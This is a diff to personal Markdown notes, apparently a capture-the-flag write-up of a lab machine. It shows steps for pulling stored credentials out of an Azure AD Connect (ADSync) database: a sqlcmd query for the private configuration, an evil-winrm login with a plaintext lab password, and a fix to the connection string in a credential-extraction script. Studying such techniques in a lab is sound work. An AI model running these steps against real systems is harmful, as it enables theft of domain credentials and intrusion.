@@ -168,3 +168,48 @@ Write-Host ("Domain: " + $domain.Domain)
 Write-Host ("Username: " + $username.Username)
 Write-Host ("Password: " + $password.Password)
 ```
+
+
+Let's see the Private_configuration
+```
+sqlcmd -Q "Use ADSync; select private_configuration_xml FROM mms_management_Agent"
+```
+![[Pasted image 20240505154724.png]]
+
+Will the in memory command
+```
+evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.10.10.172 -s .
+```
+As we are getting the error yesterday so we need to replace some code as we are not able to the get the SQL connection.
+
+![[Pasted image 20240505160023.png]]
+
+![[Pasted image 20240505160411.png]]
+We are getting the error on the 2nd line where the client is trying to open the connection.
+Let's find another way to do that.
+
+
+On googling it we found this
+```
+new-object system.data.sqlclient.sqlconnection
+```
+https://www.sqlshack.com/connecting-powershell-to-sql-server/
+
+Before
+```
+-ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+```
+
+After
+```
+Server=localhost;Integrated Security=true;Initial Catalog=ADSync
+```
+![[Pasted image 20240505160814.png]]
+
+Now the code is running aka connection is established
+![[Pasted image 20240505161134.png]]
+
+
+```
+
+```
